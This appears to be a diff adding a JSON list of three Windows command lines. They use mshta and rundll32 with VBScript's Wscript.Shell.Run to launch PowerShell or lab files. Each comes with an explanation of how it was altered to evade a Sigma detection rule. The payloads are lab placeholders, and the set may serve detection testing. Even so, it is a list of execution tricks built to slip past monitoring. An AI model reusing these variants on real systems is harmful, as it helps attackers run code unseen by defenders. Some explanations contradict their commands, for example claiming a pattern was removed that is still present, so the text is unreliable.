@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c mshta vbscript:Execute(\"CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell -noexit -file C:\\\\Lab\\\\input\\\\sample.txt\\\" :close\")",
+    "explanation": "Substitution: Replaced the suspicious path with a benign lab placeholder to avoid matching the Sigma rule's 'Wscript.Shell.Run' string pattern."
+  },
+  {
+    "output": "cmd.exe /c mshta.exe \"about:<hta:application><script language=\\\"VBScript\\\">Close(Execute(CreateObject(\\\"Wscript.Shell\\\").Run\\\" powershell.exe -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5\\\")))</script>\"",
+    "explanation": "Insertion: Added extra spaces and escaped quotes to alter the string parsing, potentially avoiding the Sigma rule's detection of the 'Wscript.Shell.Run' sequence."
+  },
+  {
+    "output": "cmd.exe /c rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"C:\\\\Lab\\\\out\\\\archive.7z\"),0)",
+    "explanation": "Substitution: Replaced the suspicious 'calc.exe' with a benign lab placeholder 'archive.7z' to avoid triggering the Sigma rule's keyword match."
+  }
+]
